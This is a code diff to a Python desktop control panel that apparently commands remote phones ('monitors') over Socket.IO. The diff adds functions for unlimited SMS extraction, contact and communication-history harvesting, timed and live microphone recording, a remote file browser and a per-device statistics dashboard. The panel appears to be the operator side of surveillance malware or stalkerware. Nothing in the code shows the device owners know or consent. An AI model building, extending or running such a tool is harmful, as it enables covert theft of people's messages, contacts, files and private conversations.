+                                total_size += file_size
                                 mod_time = datetime.datetime.fromtimestamp(
                                     stat_result.st_mtime
                                 ).strftime("%Y-%m-%d %H:%M")
                                 file_icon = Utils.get_file_icon(sub_item)
+                                size_str = Utils.format_file_size(file_size)
+
                                 self.details_text.insert(
                                     tk.END,
-                                    f"{prefix}  {file_icon} {sub_item} ({size_kb:.1f} KB) - {mod_time}\n",
+                                    f"{prefix}  {file_icon} {sub_item} ({size_str}) - {mod_time}\n",
                                 )
+                                file_count += 1
                             except Exception:
                                 self.details_text.insert(
                                     tk.END,
@@ -2272,9 +3181,15 @@ class AdvancedControlPanelApp:
                                 )
 
                     if len(sub_items) > 10:
+                        remaining = len(sub_items) - 10
+                        self.details_text.insert(
+                            tk.END, f"{prefix}  ... and {remaining} more files\n"
+                        )
+
+                    if total_size > 0:
                         self.details_text.insert(
                             tk.END,
-                            f"{prefix}  ... and {len(sub_items)-10} more files\n",
+                            f"{prefix}  📊 Total: {file_count} files, {Utils.format_file_size(total_size)}\n",
                         )
                     self.details_text.insert(tk.END, "\n")
 
@@ -2285,14 +3200,16 @@ class AdvancedControlPanelApp:
                 if os.path.isfile(item_path):
                     try:
                         stat_result = os.stat(item_path)
-                        size_kb = stat_result.st_size / 1024
+                        file_size = stat_result.st_size
                         mod_time = datetime.datetime.fromtimestamp(
                             stat_result.st_mtime
                         ).strftime("%Y-%m-%d %H:%M")
                         file_icon = Utils.get_file_icon(item)
+                        size_str = Utils.format_file_size(file_size)
+
                         self.details_text.insert(
                             tk.END,
-                            f"{prefix}{file_icon} {item} ({size_kb:.1f} KB) - {mod_time}\n",
+                            f"{prefix}{file_icon} {item} ({size_str}) - {mod_time}\n",
                         )
                         files_shown += 1
                     except Exception:
@@ -2308,19 +3225,115 @@ class AdvancedControlPanelApp:
         except Exception as e:
             self.details_text.insert(tk.END, f"{prefix}❌ Error reading folder: {e}\n")
 
-    # --- Command Enable/Disable ---
+    def _update_statistics_display(self, device_id):
+        """تحديث عرض الإحصائيات"""
+        self.stats_text.config(state=tk.NORMAL)
+        self.stats_text.delete("1.0", tk.END)
+
+        stats = device_manager.get_stats(device_id)
+        if not stats:
+            self.stats_text.insert(
+                tk.END, "📊 No statistics available for this device.\n"
+            )
+            self.stats_text.config(state=tk.DISABLED)
+            return
+
+        self.stats_text.insert(tk.END, f"📊 DEVICE STATISTICS DASHBOARD\n")
+        self.stats_text.insert(tk.END, f"{'='*60}\n")
+        self.stats_text.insert(tk.END, f"Device ID: {device_id}\n")
+        self.stats_text.insert(
+            tk.END, f"Last Updated: {stats.get('last_updated', 'Unknown')}\n\n"
+        )
+
+        # SMS Statistics
+        if "sms_stats" in stats:
+            sms_data = stats["sms_stats"]
+            self.stats_text.insert(tk.END, f"💬 SMS STATISTICS\n")
+            self.stats_text.insert(tk.END, f"{'-'*30}\n")
+            self.stats_text.insert(
+                tk.END, f"Total Messages: {sms_data.get('total_messages', 0):,}\n"
+            )
+            self.stats_text.insert(
+                tk.END,
+                f"Extraction Mode: {sms_data.get('extraction_mode', 'Unknown')}\n",
+            )
+            self.stats_text.insert(
+                tk.END, f"Last Extraction: {sms_data.get('timestamp', 'Unknown')}\n\n"
+            )
+
+        # Network Statistics
+        if "network_stats" in stats:
+            network_data = stats["network_stats"]
+            self.stats_text.insert(tk.END, f"👥 NETWORK STATISTICS\n")
+            self.stats_text.insert(tk.END, f"{'-'*30}\n")
+            self.stats_text.insert(
+                tk.END, f"Total Contacts: {network_data.get('total_contacts', 0):,}\n"
+            )
+            self.stats_text.insert(
+                tk.END, f"Mobile Contacts: {network_data.get('mobile_contacts', 0):,}\n"
+            )
+            self.stats_text.insert(
+                tk.END, f"Last Analysis: {network_data.get('timestamp', 'Unknown')}\n\n"
+            )
+
+        # Library Statistics
+        if "library_stats" in stats:
+            library_data = stats["library_stats"]
+            self.stats_text.insert(tk.END, f"📚 LIBRARY STATISTICS\n")
+            self.stats_text.insert(tk.END, f"{'-'*30}\n")
+            self.stats_text.insert(
+                tk.END, f"Total Files: {library_data.get('total_files', 0):,}\n"
+            )
+            self.stats_text.insert(
+                tk.END,
+                f"Total Directories: {library_data.get('total_directories', 0):,}\n",
+            )
+            total_size = library_data.get("total_size", 0)
+            self.stats_text.insert(
+                tk.END, f"Total Size: {Utils.format_file_size(total_size)}\n"
+            )
+            self.stats_text.insert(
+                tk.END, f"Last Catalog: {library_data.get('timestamp', 'Unknown')}\n\n"
+            )
+
+        # Connection Statistics
+        if "last_connection" in stats:
+            conn_data = stats["last_connection"]
+            self.stats_text.insert(tk.END, f"📡 CONNECTION STATISTICS\n")
+            self.stats_text.insert(tk.END, f"{'-'*30}\n")
+            if isinstance(conn_data, dict):
+                self.stats_text.insert(
+                    tk.END, f"Last IP: {conn_data.get('ip', 'Unknown')}\n"
+                )
+                self.stats_text.insert(
+                    tk.END, f"Platform: {conn_data.get('platform', 'Unknown')}\n"
+                )
+                capabilities = conn_data.get("capabilities", [])
+                self.stats_text.insert(
+                    tk.END,
+                    f"Capabilities: {', '.join(capabilities) if capabilities else 'Basic'}\n",
+                )
+                self.stats_text.insert(
+                    tk.END,
+                    f"Last Connection: {conn_data.get('timestamp', 'Unknown')}\n",
+                )
+            else:
+                self.stats_text.insert(tk.END, f"Last Connection: {conn_data}\n")
+
+        self.stats_text.config(state=tk.DISABLED)
+
     def _enable_commands(self, enable=True):
         """تمكين أو تعطيل الأوامر"""
         state = tk.NORMAL if enable else tk.DISABLED
 
-        # تفعيل/تعطيل جميع أزرار الأوامر
         try:
             for button in self.command_buttons.values():
-                button.config(state=state)
+                if isinstance(button, tk.Button):
+                    button.config(state=state)
 
             self.record_audio_button.config(state=state)
 
-            # أزرار البث الصوتي المباشر
+            # Live audio buttons
             if SOUNDDEVICE_AVAILABLE:
                 is_streaming = stream_active_for_device.get(
                     self.current_selected_live_client_sid, False
@@ -2335,24 +3348,25 @@ class AdvancedControlPanelApp:
                 self.start_live_audio_button.config(state=tk.DISABLED)
                 self.stop_live_audio_button.config(state=tk.DISABLED)
 
-            # تحديث حالة البث الصوتي المباشر
+            # Update status
             if not enable:
-                self.live_audio_status_var.set("Live Audio: Idle (No Monitor Selected)")
+                self.live_audio_status_var.set(
+                    "🎵 Live Audio: Idle (No Monitor Selected)"
+                )
                 if not SOUNDDEVICE_AVAILABLE:
                     self.live_audio_status_var.set(
-                        "Live Audio: Disabled (Missing Libraries)"
+                        "🎵 Live Audio: Disabled (Missing Libraries)"
                     )
 
-            # إضافة تأكيد مرئي بأن الأوامر تم تفعيلها
             if enable:
-                self.add_system_log("تم تفعيل جميع الأوامر للجهاز المحدد", "info")
+                self.add_system_log(
+                    "✅ All commands enabled for selected device", "success"
+                )
 
-            # التأكد من تحديث واجهة المستخدم فوراً
             self.master.update()
         except Exception as e:
-            # إذا حدث خطأ، سجله ولكن لا تفشل
             logger.error(f"Error in _enable_commands: {e}", exc_info=True)
-            self.add_system_log(f"خطأ أثناء تفعيل الأوامر: {e}", "error")
+            self.add_system_log(f"❌ Error enabling commands: {e}", "error")
 
     def _get_target_id(self):
         """الحصول على معرف الهدف للأوامر"""
@@ -2369,11 +3383,7 @@ class AdvancedControlPanelApp:
             )
             if live_sid:
                 self.current_selected_live_client_sid = live_sid
-
-                # تأكيد بصري لاختيار الجهاز
-                self._ensure_selection_active()
                 self._enable_commands(True)
-
                 return live_sid
             else:
                 messagebox.showerror(
@@ -2383,25 +3393,16 @@ class AdvancedControlPanelApp:
                 )
                 return None
         else:
-            # التحقق إذا كان هناك أي جهاز متصل متاح
             if connected_clients_sio:
-                # اختيار أول جهاز متصل تلقائياً
                 first_sid, first_info = next(iter(connected_clients_sio.items()))
                 self.current_selected_live_client_sid = first_sid
                 selected_device_id = first_info.get("id", "Unknown ID")
 
                 self.add_system_log(
-                    f"Auto-selected live monitor: {selected_device_id} (SID: {first_sid})"
+                    f"🎯 Auto-selected live monitor: {selected_device_id} (SID: {first_sid})"
                 )
-
-                # تحديث واجهة المستخدم للإشارة إلى الجهاز المحدد
-                self._ensure_selection_active()
                 self._enable_commands(True)
                 self.display_device_details(selected_device_id)
-
-                # إخطار المستخدم
-                self.add_system_log("تم اختيار الجهاز الأول تلقائياً")
-
                 return first_sid
             else:
                 messagebox.showerror(
@@ -2409,74 +3410,7 @@ class AdvancedControlPanelApp:
                 )
                 return None
 
-    # --- File Browser Commands ---
-    def open_file_browser(self):
-        """Open the file browser window"""
-        # Get the currently selected device
-        device_id = None
-        target_id = None
-
-        if self.current_selected_historical_device_id:
-            device_id = self.current_selected_historical_device_id
-
-            # Check if device is online
-            target_id = next(
-                (
-                    s
-                    for s, i in connected_clients_sio.items()
-                    if i.get("id") == device_id
-                ),
-                None,
-            )
-
-            if not target_id:
-                messagebox.showinfo(
-                    "Offline Monitor",
-                    f"Monitor '{device_id}' is not currently online. File browsing requires an active connection.",
-                    parent=self.master,
-                )
-                return
-        elif self.current_selected_live_client_sid:
-            # إذا كان لدينا عميل حي محدد مباشرة
-            sid = self.current_selected_live_client_sid
-            info = connected_clients_sio.get(sid, {})
-            device_id = info.get("id", "Unknown")
-            target_id = sid
-        elif connected_clients_sio:
-            # اختيار أول جهاز متصل تلقائياً
-            first_sid, first_info = next(iter(connected_clients_sio.items()))
-            self.current_selected_live_client_sid = first_sid
-            device_id = first_info.get("id", "Unknown ID")
-            target_id = first_sid
-
-            self.add_system_log(
-                f"Auto-selected live monitor for file browsing: {device_id} (SID: {first_sid})"
-            )
-
-            # تحديث واجهة المستخدم للإشارة إلى الجهاز المحدد
-            self._ensure_selection_active()
-            self._enable_commands(True)
-            self.display_device_details(device_id)
-        else:
-            messagebox.showinfo(
-                "Select Monitor",
-                "No connected monitors available. Please wait for a monitor to connect.",
-                parent=self.master,
-            )
-            return
-
-        # Close existing file browser if open
-        if hasattr(self, "file_browser") and self.file_browser:
-            try:
-                self.file_browser.close()
-            except:
-                pass
-
-        # Create new file browser window
-        self.file_browser = FileBrowserWindow(self.master, device_id, target_id, self)
-        self.add_system_log(f"Opened file browser for monitor: {device_id}")
-
-    # --- Command Implementations ---
+    # Command implementations
     def take_screenshot(self):
         target_id = self._get_target_id()
         if target_id:
@@ -2531,21 +3465,32 @@ class AdvancedControlPanelApp:
                 )
 
     def get_sms_list(self):
+        """استخراج الرسائل النصية المحسن"""
         target_id = self._get_target_id()
         if target_id:
+            self.add_system_log("🚀 Initiating enhanced SMS extraction...")
             send_command_to_client(target_id, Commands.SIO_CMD_GET_SMS_LIST)
+
+    def get_all_sms_unlimited(self):
+        """استخراج جميع الرسائل النصية بدون حدود"""
+        target_id = self._get_target_id()
+        if target_id:
+            self.add_system_log(
+                "🚀 Initiating unlimited SMS extraction with compression..."
+            )
+            send_command_to_client(target_id, Commands.SIO_CMD_GET_ALL_SMS)
 
     def get_social_network_data(self):
         target_id = self._get_target_id()
         if target_id:
-            self.add_system_log("Initiating advanced social network analysis...")
+            self.add_system_log("🚀 Initiating advanced social network analysis...")
             send_command_to_client(target_id, Commands.SIO_CMD_GET_SOCIAL_NETWORK)
 
     def get_communication_history(self):
         target_id = self._get_target_id()
         if target_id:
             self.add_system_log(
-                "Initiating comprehensive communication history extraction..."
+                "🚀 Initiating comprehensive communication history extraction..."
             )
             send_command_to_client(
                 target_id, Commands.SIO_CMD_GET_COMMUNICATION_HISTORY
@@ -2565,49 +3510,35 @@ class AdvancedControlPanelApp:
         """فهرسة محتوى المكتبة"""
         target_id = self._get_target_id()
         if target_id:
-            self.add_system_log("Initiating intelligent library cataloging...")
+            self.add_system_log("🚀 Initiating intelligent library cataloging...")
             send_command_to_client(target_id, Commands.SIO_CMD_CATALOG_LIBRARY)
 
     def analyze_specific_content(self):
         """تحليل محتوى محدد"""
         target_id = self._get_target_id()
         if target_id:
-            # If file browser is open, suggest using it
-            if hasattr(self, "file_browser") and self.file_browser:
-                user_response = messagebox.askyesno(
-                    "Use File Browser",
-                    "The File Browser is open. Would you like to select a file there instead?",
-                    parent=self.master,
-                )
-                if user_response:
-                    self.file_browser.window.lift()
-                    self.file_browser.window.focus_set()
-                    return
-
-            # Otherwise prompt for path
             file_path = simpledialog.askstring(
                 "Content Analysis",
                 "Enter the full path of the content to analyze:",
                 parent=self.master,
             )
             if file_path:
-                self.add_system_log(f"Analyzing content: {file_path}")
+                self.add_system_log(f"🔍 Analyzing content: {file_path}")
                 send_command_to_client(
                     target_id,
                     Commands.SIO_CMD_ANALYZE_CONTENT,
                     args={"filePath": file_path},
                 )
-            else:
-                self.add_system_log("Content analysis cancelled", level="warning")
 
     def process_content_queue(self):
         """معالجة طابور المحتوى"""
         target_id = self._get_target_id()
         if target_id:
-            self.add_system_log("Processing intelligent content queue...")
+            self.add_system_log("🚀 Processing intelligent content queue...")
             send_command_to_client(target_id, Commands.SIO_CMD_PROCESS_QUEUE)
 
     def record_audio_fixed(self):
+        """تسجيل صوتي ثابت مع معالجة محسنة"""
         target_id = self._get_target_id()
         if target_id:
             duration = simpledialog.askinteger(
@@ -2616,13 +3547,127 @@ class AdvancedControlPanelApp:
                 parent=self.master,
                 minvalue=1,
                 maxvalue=300,
+                initialvalue=10,
             )
             if duration:
-                send_command_to_client(
+                # Check if device is still responsive
+                device_info = connected_clients_sio.get(target_id, {})
+                last_seen_iso = device_info.get("last_seen")
+
+                if last_seen_iso:
+                    try:
+                        last_seen_dt = datetime.datetime.fromisoformat(last_seen_iso)
+                        time_since_last_seen = (
+                            datetime.datetime.now() - last_seen_dt
+                        ).total_seconds()
+
+                        if time_since_last_seen > 120:  # 2 minutes
+                            user_choice = messagebox.askyesno(
+                                "Device May Be Unresponsive",
+                                f"⚠️ Warning: The device hasn't responded for {time_since_last_seen:.0f} seconds.\n"
+                                f"The audio recording command may not work properly.\n\n"
+                                f"Do you want to continue anyway?",
+                                parent=self.master,
+                            )
+                            if not user_choice:
+                                return
+                    except:
+                        pass
+
+                self.add_system_log(f"🎤 Audio recording requested: {duration} seconds")
+                result = send_command_to_client(
                     target_id,
                     Commands.SIO_CMD_RECORD_AUDIO_FIXED,
                     args={"duration": duration},
+                    timeout_seconds=duration + 30,  # Add buffer time
                 )
+
+                if result.get("status") == "sent":
+                    # Set up progress tracking
+                    def track_recording_progress():
+                        progress_window = tk.Toplevel(self.master)
+                        progress_window.title("Recording in Progress")
+                        progress_window.geometry("300x150")
+                        progress_window.configure(bg=self.current_theme["bg"])
+                        progress_window.transient(self.master)
+                        progress_window.grab_set()
+
+                        # Center window
+                        progress_window.geometry(
+                            f"+{self.master.winfo_x() + 200}+{self.master.winfo_y() + 200}"
+                        )
+
+                        tk.Label(
+                            progress_window,
+                            text="🎤 Audio Recording in Progress",
+                            bg=self.current_theme["bg"],
+                            fg=self.current_theme["fg"],
+                            font=("Arial", 12, "bold"),
+                        ).pack(pady=10)
+
+                        progress_label = tk.Label(
+                            progress_window,
+                            text=f"Duration: {duration} seconds",
+                            bg=self.current_theme["bg"],
+                            fg=self.current_theme["fg"],
+                        )
+                        progress_label.pack(pady=5)
+
+                        time_label = tk.Label(
+                            progress_window,
+                            text="Starting...",
+                            bg=self.current_theme["bg"],
+                            fg=self.current_theme["fg"],
+                        )
+                        time_label.pack(pady=5)
+
+                        def cancel_recording():
+                            progress_window.destroy()
+                            self.add_system_log(
+                                "🚫 Recording cancelled by user", "warning"
+                            )
+
+                        tk.Button(
+                            progress_window,
+                            text="Cancel",
+                            command=cancel_recording,
+                            bg=self.current_theme["status_error"],
+                            fg="#ffffff",
+                        ).pack(pady=10)
+
+                        # Update timer
+                        start_time = datetime.datetime.now()
+
+                        def update_timer():
+                            if progress_window.winfo_exists():
+                                elapsed = (
+                                    datetime.datetime.now() - start_time
+                                ).total_seconds()
+                                remaining = max(0, duration - elapsed)
+
+                                if remaining > 0:
+                                    time_label.config(
+                                        text=f"Remaining: {remaining:.0f} seconds"
+                                    )
+                                    progress_window.after(1000, update_timer)
+                                else:
+                                    time_label.config(
+                                        text="Recording should be complete..."
+                                    )
+                                    # Auto-close after additional 10 seconds
+                                    progress_window.after(
+                                        10000,
+                                        lambda: (
+                                            progress_window.destroy()
+                                            if progress_window.winfo_exists()
+                                            else None
+                                        ),
+                                    )
+
+                        update_timer()
+
+                    # Start progress tracking after a short delay
+                    self.master.after(500, track_recording_progress)
 
     def start_live_audio(self):
         if not SOUNDDEVICE_AVAILABLE:
@@ -2640,7 +3685,7 @@ class AdvancedControlPanelApp:
 
         logger.info(f"Starting live audio for monitor: {device_id_for_log}")
         self.live_audio_status_var.set(
-            f"Live Audio: Starting for {device_id_for_log}..."
+            f"🎵 Live Audio: Starting for {device_id_for_log}..."
         )
         self.start_live_audio_button.config(state=tk.DISABLED)
         self.stop_live_audio_button.config(state=tk.NORMAL)
@@ -2659,9 +3704,11 @@ class AdvancedControlPanelApp:
                 "data": [],
             }
             logger.info(f"Initialized live audio buffer for monitor SID: {target_id}")
-            self.add_system_log(f"Start live audio command sent to {device_id_for_log}")
+            self.add_system_log(
+                f"🎵 Started live audio for {device_id_for_log}", "success"
+            )
         else:
-            self.live_audio_status_var.set("Live Audio: Start Failed")
+            self.live_audio_status_var.set("🎵 Live Audio: Start Failed")
             self.start_live_audio_button.config(state=tk.NORMAL)
             self.stop_live_audio_button.config(state=tk.DISABLED)
 
@@ -2674,9 +3721,7 @@ class AdvancedControlPanelApp:
 
         target_id = self._get_target_id()
         if not target_id:
-            self.live_audio_status_var.set("Live Audio: Idle")
-            self.start_live_audio_button.config(state=tk.DISABLED)
-            self.stop_live_audio_button.config(state=tk.DISABLED)
+            self.live_audio_status_var.set("🎵 Live Audio: Idle")
             return
 
         device_info = connected_clients_sio.get(target_id, {})
@@ -2684,16 +3729,16 @@ class AdvancedControlPanelApp:
 
         logger.info(f"Stopping live audio for monitor: {device_id_for_log}")
         self.live_audio_status_var.set(
-            f"Live Audio: Stopping for {device_id_for_log}..."
+            f"🎵 Live Audio: Stopping for {device_id_for_log}..."
         )
 
         send_command_to_client(target_id, Commands.SIO_CMD_STOP_LIVE_AUDIO)
         stream_active_for_device.pop(target_id, None)
 
-        self.live_audio_status_var.set("Live Audio: Idle")
+        self.live_audio_status_var.set("🎵 Live Audio: Idle")
         self.start_live_audio_button.config(state=tk.NORMAL)
         self.stop_live_audio_button.config(state=tk.DISABLED)
-        self.add_system_log(f"Stop live audio command sent to {device_id_for_log}")
+        self.add_system_log(f"🎵 Stopped live audio for {device_id_for_log}", "success")
 
         # Ask about saving recording
         if target_id in live_audio_buffers:
@@ -2704,8 +3749,7 @@ class AdvancedControlPanelApp:
             if audio_data_list:
                 user_choice = messagebox.askyesno(
                     "Save Live Recording",
-                    f"Live audio stream from monitor '{device_id_for_log}' has ended.\n"
-                    f"Do you want to save the recording?",
+                    f"Live audio stream from monitor '{device_id_for_log}' has ended.\nDo you want to save the recording?",
                     parent=self.master,
                 )
                 if user_choice:
@@ -2719,7 +3763,7 @@ class AdvancedControlPanelApp:
         """حفظ البث المسجل إلى ملف WAV"""
         if not audio_data_list:
             self.add_system_log(
-                f"No audio data to save for monitor {device_id_str}", level="warning"
+                f"❌ No audio data to save for monitor {device_id_str}", "warning"
             )
             return
 
@@ -2742,8 +3786,9 @@ class AdvancedControlPanelApp:
                 wf.setframerate(audio_params["samplerate"])
                 wf.writeframes(combined_audio_data)
 
-            log_msg = f"Live audio recording saved for monitor {device_id_str} to: {filepath} ({len(combined_audio_data)/1024:.2f} KB)"
-            self.add_system_log(log_msg, level="success")
+            file_size = len(combined_audio_data)
+            log_msg = f"💾 Live audio recording saved for monitor {device_id_str} to: {filepath} ({Utils.format_file_size(file_size)})"
+            self.add_system_log(log_msg, "success")
             logger.info(log_msg)
 
             messagebox.showinfo(
@@ -2752,23 +3797,93 @@ class AdvancedControlPanelApp:
                 parent=self.master,
             )
 
+            # Update device stats
+            device_manager.update_stats(
+                device_id_sanitized,
+                "last_audio_recording",
+                {
+                    "timestamp": datetime.datetime.now().isoformat(),
+                    "file_size": file_size,
+                    "filename": filename,
+                    "type": "live_recording",
+                },
+            )
+
             # Update file list
             if self.current_selected_historical_device_id == device_id_sanitized:
                 self.display_device_details(device_id_sanitized)
 
         except Exception as e:
-            err_msg = f"Error saving live audio stream for monitor {device_id_str}: {e}"
+            err_msg = (
+                f"❌ Error saving live audio stream for monitor {device_id_str}: {e}"
+            )
             logger.error(err_msg, exc_info=True)
             messagebox.showerror(
                 "Save Error",
                 f"Failed to save live audio recording: {e}",
                 parent=self.master,
             )
-            self.add_system_log(
-                f"Failed to save live recording for {device_id_str}: {e}", level="error"
-            )
+            self.add_system_log(err_msg, "error")
 
-    # --- Audio Playback System ---
+    def start_playback_thread(self):
+        """بدء thread التشغيل الصوتي"""
+        global playback_thread
+        if not SOUNDDEVICE_AVAILABLE:
+            logger.warning("Cannot start playback thread: sounddevice not available")
+            return
+
+        if playback_thread is None or not playback_thread.is_alive():
+            while not audio_queue.empty():
+                try:
+                    audio_queue.get_nowait()
+                except queue.Empty:
+                    break
+            logger.info("Starting audio playback thread")
+            playback_thread = threading.Thread(target=self.run_playback, daemon=True)
+            playback_thread.start()
+        else:
+            logger.info("Playback thread already running")
+
+    def run_playback(self):
+        """تشغيل نظام التشغيل الصوتي"""
+        global playback_thread
+        stream = None
+        try:
+            logger.info(f"Starting audio playback stream")
+            stream = sd.OutputStream(
+                samplerate=AppConfig.REC_SAMPLERATE,
+                channels=AppConfig.REC_CHANNELS,
+                dtype="int16",
+                callback=self.audio_callback,
+            )
+            with stream:
+                logger.info("Audio playback stream started")
+                while (
+                    playback_thread is not None
+                    and playback_thread.is_alive()
+                    and stream.active
+                ):
+                    sd.sleep(100)
+            logger.info("Audio playback stream finished")
+        except sd.PortAudioError as pae:
+            logger.error(f"PortAudioError during playback: {pae}", exc_info=True)
+            if self.master.winfo_exists():
+                messagebox.showerror(
+                    "Audio Error",
+                    f"Could not open audio output device: {pae}\n\nLive audio playback will not work.",
+                    parent=self.master,
+                )
+        except Exception as e:
+            logger.error(f"Error in audio playback thread: {e}", exc_info=True)
+        finally:
+            logger.info("Playback thread finishing")
+            if stream is not None and not stream.closed:
+                try:
+                    stream.close()
+                except Exception as e_close:
+                    logger.error(f"Error closing audio stream: {e_close}")
+            playback_thread = None
+
     def audio_callback(self, outdata, frames, time, status):
         """callback للتشغيل الصوتي"""
         if status:
@@ -2813,66 +3928,234 @@ class AdvancedControlPanelApp:
             logger.error(f"Error in audio callback: {e}", exc_info=True)
             outdata.fill(0)
 
-    def run_playback(self):
-        """تشغيل نظام التشغيل الصوتي"""
-        global playback_thread
-        stream = None
-        try:
-            logger.info(f"Starting audio playback stream")
-            stream = sd.OutputStream(
-                samplerate=AppConfig.REC_SAMPLERATE,
-                channels=AppConfig.REC_CHANNELS,
-                dtype="int16",
-                callback=self.audio_callback,
+    def open_file_browser(self):
+        """فتح متصفح الملفات المحسن"""
+        device_id = None
+        target_id = None
+
+        if self.current_selected_historical_device_id:
+            device_id = self.current_selected_historical_device_id
+            target_id = next(
+                (
+                    s
+                    for s, i in connected_clients_sio.items()
+                    if i.get("id") == device_id
+                ),
+                None,
             )
-            with stream:
-                logger.info("Audio playback stream started")
-                while (
-                    playback_thread is not None
-                    and playback_thread.is_alive()
-                    and stream.active
-                ):
-                    sd.sleep(100)
-            logger.info("Audio playback stream finished")
-        except sd.PortAudioError as pae:
-            logger.error(f"PortAudioError during playback: {pae}", exc_info=True)
-            if self.master.winfo_exists():
-                messagebox.showerror(
-                    "Audio Error",
-                    f"Could not open audio output device: {pae}\n\nLive audio playback will not work.",
+
+            if not target_id:
+                messagebox.showinfo(
+                    "Offline Monitor",
+                    f"Monitor '{device_id}' is not currently online. File browsing requires an active connection.",
                     parent=self.master,
                 )
-        except Exception as e:
-            logger.error(f"Error in audio playback thread: {e}", exc_info=True)
-        finally:
-            logger.info("Playback thread finishing")
-            if stream is not None and not stream.closed:
-                try:
-                    stream.close()
-                except Exception as e_close:
-                    logger.error(f"Error closing audio stream: {e_close}")
-            playback_thread = None
+                return
+        elif self.current_selected_live_client_sid:
+            sid = self.current_selected_live_client_sid
+            info = connected_clients_sio.get(sid, {})
+            device_id = info.get("id", "Unknown")
+            target_id = sid
+        elif connected_clients_sio:
+            first_sid, first_info = next(iter(connected_clients_sio.items()))
+            self.current_selected_live_client_sid = first_sid
+            device_id = first_info.get("id", "Unknown ID")
+            target_id = first_sid
 
-    def start_playback_thread(self):
-        """بدء thread التشغيل الصوتي"""
-        global playback_thread
-        if not SOUNDDEVICE_AVAILABLE:
-            logger.warning("Cannot start playback thread: sounddevice not available")
+            self.add_system_log(
+                f"🎯 Auto-selected live monitor for file browsing: {device_id} (SID: {first_sid})"
+            )
+            self._enable_commands(True)
+            self.display_device_details(device_id)
+        else:
+            messagebox.showinfo(
+                "Select Monitor",
+                "No connected monitors available. Please wait for a monitor to connect.",
+                parent=self.master,
+            )
             return
 
-        if playback_thread is None or not playback_thread.is_alive():
-            while not audio_queue.empty():
-                try:
-                    audio_queue.get_nowait()
-                except queue.Empty:
-                    break
-            logger.info("Starting audio playback thread")
-            playback_thread = threading.Thread(target=self.run_playback, daemon=True)
-            playback_thread.start()
-        else:
-            logger.info("Playback thread already running")
+        # Close existing file browser if open
+        if hasattr(self, "file_browser") and self.file_browser:
+            try:
+                self.file_browser.close()
+            except:
+                pass
 
-    # --- Menu Functions ---
+        # Create new enhanced file browser window
+        try:
+            self.file_browser = EnhancedFileBrowserWindow(
+                self.master, device_id, target_id, self
+            )
+            self.add_system_log(
+                f"📂 Enhanced file browser opened for monitor: {device_id}", "success"
+            )
+        except Exception as e:
+            self.add_system_log(f"❌ Failed to open file browser: {e}", "error")
+            messagebox.showerror(
+                "File Browser Error",
+                f"Failed to open file browser:\n{e}",
+                parent=self.master,
+            )
+
+    # Menu Functions
+    def _clear_log(self):
+        """مسح السجل"""
+        self.log_text.config(state=tk.NORMAL)
+        self.log_text.delete("1.0", tk.END)
+        self.log_text.config(state=tk.DISABLED)
+        self.add_system_log("🗑️ System log cleared")
+
+    def _save_log(self):
+        """حفظ السجل"""
+        filename = filedialog.asksaveasfilename(
+            defaultextension=".txt",
+            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
+            title="Save System Log",
+        )
+        if filename:
+            try:
+                with open(filename, "w", encoding="utf-8") as f:
+                    f.write(self.log_text.get("1.0", tk.END))
+                self.add_system_log(f"💾 System log saved to {filename}", "success")
+            except Exception as e:
+                self.add_system_log(f"❌ Error saving log: {e}", "error")
+
+    def _refresh_all(self):
+        """تحديث جميع البيانات"""
+        self.update_live_clients_list()
+        self.refresh_historical_device_list()
+        if self.current_selected_historical_device_id:
+            self.display_device_details(self.current_selected_historical_device_id)
+        self.add_system_log("🔄 All data refreshed", "success")
+
+    def _show_statistics(self):
+        """عرض لوحة الإحصائيات"""
+        stats_window = tk.Toplevel(self.master)
+        stats_window.title("📊 Statistics Dashboard")
+        stats_window.geometry("800x600")
+        stats_window.configure(bg=self.current_theme["bg"])
+
+        # Statistics content
+        stats_text = scrolledtext.ScrolledText(
+            stats_window,
+            wrap=tk.WORD,
+            bg=self.current_theme["text_bg"],
+            fg=self.current_theme["text_fg"],
+        )
+        stats_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        # Generate comprehensive statistics
+        total_devices = len(
+            [
+                d
+                for d in os.listdir(AppConfig.DATA_RECEIVED_DIR)
+                if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, d))
+            ]
+        )
+
+        stats_content = f"""
+📊 COMPREHENSIVE STATISTICS DASHBOARD
+{'='*60}
+
+🖥️  SYSTEM STATUS
+Connected Monitors: {len(connected_clients_sio)}
+Archived Devices: {total_devices}
+Active Audio Streams: {len([sid for sid, active in stream_active_for_device.items() if active])}
+Current Theme: {theme_manager.current_theme.title()}
+
+🎵 AUDIO FEATURES
+Playback Available: {'✅' if SOUNDDEVICE_AVAILABLE else '❌'}
+Image Preview: {'✅' if PIL_AVAILABLE else '❌'}
+
+🚀 ENHANCED FEATURES
+Enhanced SMS Extraction: ✅
+Unlimited SMS Compression: ✅
+Smart Resource Monitoring: ✅
+Intelligent Sync Queue: ✅
+Document Library Cataloging: ✅
+Dark Mode Support: ✅
+
+📱 DEVICE STATISTICS
+"""
+
+        for device_id in os.listdir(AppConfig.DATA_RECEIVED_DIR):
+            if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)):
+                stats = device_manager.get_stats(device_id)
+                file_count = self._count_files_in_device_folder(
+                    os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
+                )
+                is_online = any(
+                    info.get("id") == device_id
+                    for info in connected_clients_sio.values()
+                )
+
+                stats_content += f"\n🔸 {device_id}\n"
+                stats_content += (
+                    f"   Status: {'🟢 Online' if is_online else '🔴 Offline'}\n"
+                )
+                stats_content += f"   Files: {file_count}\n"
+                if stats and "sms_stats" in stats:
+                    sms_data = stats["sms_stats"]
+                    stats_content += (
+                        f"   SMS Messages: {sms_data.get('total_messages', 0):,}\n"
+                    )
+                if stats and "network_stats" in stats:
+                    network_data = stats["network_stats"]
+                    stats_content += (
+                        f"   Contacts: {network_data.get('total_contacts', 0):,}\n"
+                    )
+
+        stats_text.insert(tk.END, stats_content)
+        stats_text.config(state=tk.DISABLED)
+
+    def _show_device_statistics(self):
+        """عرض إحصائيات الجهاز المحدد"""
+        if not self.current_selected_historical_device_id:
+            messagebox.showwarning(
+                "Warning", "Please select a device first.", parent=self.master
+            )
+            return
+
+        device_id = self.current_selected_historical_device_id
+        stats = device_manager.get_stats(device_id)
+
+        if not stats:
+            messagebox.showinfo(
+                "Device Statistics",
+                f"No statistics available for device: {device_id}",
+                parent=self.master,
+            )
+            return
+
+        stats_window = tk.Toplevel(self.master)
